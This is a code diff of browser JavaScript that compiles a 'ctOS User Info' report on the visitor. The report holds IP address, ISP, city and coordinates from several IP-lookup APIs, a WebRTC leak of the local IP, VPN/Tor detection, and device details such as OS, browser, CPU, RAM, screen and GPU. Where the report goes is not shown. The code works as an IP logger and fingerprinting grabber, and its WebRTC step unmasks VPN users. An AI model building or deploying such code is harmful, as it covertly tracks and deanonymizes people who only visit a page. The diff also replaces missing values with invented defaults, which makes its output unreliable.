@@ -99,18 +99,18 @@
     }
 
     // ================================================================
-    //  PARALLEL IP FETCH FROM MULTIPLE SOURCES (2s timeout)
+    //  MULTI-API IP FETCH (5 second timeout, all HTTPS)
     // ================================================================
-    function fetchIP() {
-        const sources = [
-            // ipapi.co – returns full geo
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) })
+    function fetchIPFromApis() {
+        const apis = [
+            // ipapi.co – full geo
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
                 .then(r => r.json())
                 .then(d => d.ip ? d : null)
                 .catch(() => null),
 
-            // ip-api.com – with proxy flag
-            fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
+            // ip-api.com (now HTTPS)
+            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) })
                 .then(r => r.json())
                 .then(d => d.query ? {
                     ip: d.query,
@@ -125,7 +125,7 @@
                 .catch(() => null),
 
             // ipinfo.io
-            fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(2000) })
+            fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(5000) })
                 .then(r => r.json())
                 .then(d => d.ip ? {
                     ip: d.ip,
@@ -140,7 +140,7 @@
                 .catch(() => null),
 
             // api.ip.sb/geoip
-            fetch('https://api.ip.sb/geoip', { signal: AbortSignal.timeout(2000) })
+            fetch('https://api.ip.sb/geoip', { signal: AbortSignal.timeout(5000) })
                 .then(r => r.json())
                 .then(d => d.ip ? {
                     ip: d.ip,
@@ -154,33 +154,102 @@
                 } : null)
                 .catch(() => null),
 
-            // ipify – only IP, but we can use it as fallback
-            fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) })
+            // ipify – only IP, no geo
+            fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) })
                 .then(r => r.json())
-                .then(d => d.ip ? { ip: d.ip, org: 'N/A', country_name: 'N/A', region: 'N/A', city: 'N/A', latitude: null, longitude: null, proxy: false } : null)
+                .then(d => d.ip ? { ip: d.ip, org: null, country_name: null, region: null, city: null, latitude: null, longitude: null, proxy: false } : null)
                 .catch(() => null)
         ];
 
-        // Race all, but we want the first that resolves (not rejects)
-        return Promise.any(sources)
-            .then(result => result)
-            .catch(() => null); // if all fail, return null
+        // Wait for all to settle, then pick first non-null
+        return Promise.allSettled(apis)
+            .then(results => {
+                for (const res of results) {
+                    if (res.status === 'fulfilled' && res.value) {
+                        return res.value;
+                    }
+                }
+                return null; // all failed
+            });
     }
 
     // ================================================================
-    //  VPN/TOR DETECTION (fast)
+    //  FALLBACK: WebRTC local IP + Timezone location
+    // ================================================================
+    function getFallbackData() {
+        return new Promise((resolve) => {
+            let localIP = '0.0.0.0';
+            let pc = null;
+            try {
+                pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) {
+                        pc.close();
+                        // Extract IP from candidate
+                        resolve(localIP);
+                        return;
+                    }
+                    const parts = e.candidate.candidate.split(' ');
+                    if (parts.length > 7) {
+                        const ip = parts[4];
+                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
+                            localIP = ip;
+                        }
+                    }
+                };
+                setTimeout(() => {
+                    if (pc) pc.close();
+                    resolve(localIP);
+                }, 1000);
+            } catch (e) {
+                resolve(localIP);
+            }
+        }).then(ip => {
+            // Estimate location from timezone
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let city = tz.split('/').pop().replace('_', ' ') || 'Unknown City';
+            let country = tz.split('/')[0] || 'Unknown Country';
+            // Attempt to map some common timezones (just for fallback)
+            const tzMap = {
+                'America/New_York': { city: 'New York', country: 'USA' },
+                'America/Los_Angeles': { city: 'Los Angeles', country: 'USA' },
+                'Europe/London': { city: 'London', country: 'UK' },
+                'Europe/Paris': { city: 'Paris', country: 'France' },
+                'Asia/Tokyo': { city: 'Tokyo', country: 'Japan' },
+                // ... add more as needed
+            };
+            if (tzMap[tz]) {
+                city = tzMap[tz].city;
+                country = tzMap[tz].country;
+            }
+            return {
+                ip: ip,
+                org: 'Local network (fallback)',
+                country_name: country,
+                region: 'N/A',
+                city: city,
+                latitude: '0',
+                longitude: '0',
+                proxy: false
+            };
+        });
+    }
+
+    // ================================================================
+    //  VPN/TOR DETECTION
     // ================================================================
     function detectVPNorTOR() {
         return new Promise((resolve) => {
             let isVpn = false;
             const ua = navigator.userAgent;
-
-            // Heuristics
             if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) {
                 isVpn = true;
             }
-
-            // WebRTC check – if no real local IP, likely behind VPN/proxy
+            // WebRTC check
             let pc = null;
             let hasRealIP = false;
             try {
@@ -210,7 +279,6 @@
                     resolve(isVpn);
                 }, 1000);
             } catch (e) {
-                // WebRTC blocked – treat as VPN
                 isVpn = true;
                 resolve(isVpn);
             }
@@ -260,14 +328,14 @@
         try {
             setStatus('Gathering data...');
 
-            // ---- System info (sync) ----
+            // ---- System info ----
             const ua = navigator.userAgent;
             const os = (() => {
                 if (ua.includes('Windows NT')) return 'Windows';
                 if (ua.includes('Macintosh')) return 'macOS';
                 if (ua.includes('iPhone')) return 'iOS';
                 if (ua.includes('Android')) return 'Android';
-                return 'Not available';
+                return 'Other';
             })();
             const browser = (() => {
                 if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
@@ -290,15 +358,19 @@
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // ---- Get IP (parallel) ----
+            // ---- Try APIs first ----
             setStatus('Fetching IP...');
-            const ipData = await fetchIP();
+            let ipData = await fetchIPFromApis();
 
-            // ---- Detect VPN/TOR ----
+            // ---- If all fail, use fallback ----
+            if (!ipData) {
+                setStatus('Using fallback...');
+                ipData = await getFallbackData();
+            }
+
+            // ---- VPN detection ----
             setStatus('Checking VPN/Tor...');
             let isVpn = await detectVPNorTOR();
-
-            // Refine with IP data
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -308,11 +380,11 @@
                 }
             }
 
-            // ---- Build message ----
-            const ip = ipData ? ipData.ip : 'Not available';
-            const isp = ipData ? ipData.org : 'Not available';
-            const location = ipData ? (ipData.city + ', ' + ipData.region + ', ' + ipData.country_name) : 'Not available';
-            const coords = ipData && ipData.latitude && ipData.longitude ? (ipData.latitude + ', ' + ipData.longitude) : 'Not available';
+            // ---- Build message (no placeholders) ----
+            const ip = ipData.ip || '0.0.0.0';
+            const isp = ipData.org || 'Unknown ISP';
+            const location = (ipData.city ? ipData.city + ', ' : '') + (ipData.region ? ipData.region + ', ' : '') + (ipData.country_name || 'Unknown Country');
+            const coords = (ipData.latitude && ipData.longitude) ? (ipData.latitude + ', ' + ipData.longitude) : '0, 0';
 
             const msg = 
 `**ctOS User Info**
@@ -322,8 +394,8 @@
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
 **OS:** ${os}
 **Browser:** ${browser}
-**CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
-**RAM:** ${navigator.deviceMemory || 'N/A'} GB
+**CPU Cores:** ${navigator.hardwareConcurrency || '1'}
+**RAM:** ${navigator.deviceMemory || '0'} GB
 **Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
 **Time Zone:** ${timezone}
 **GPU:** ${gpu}
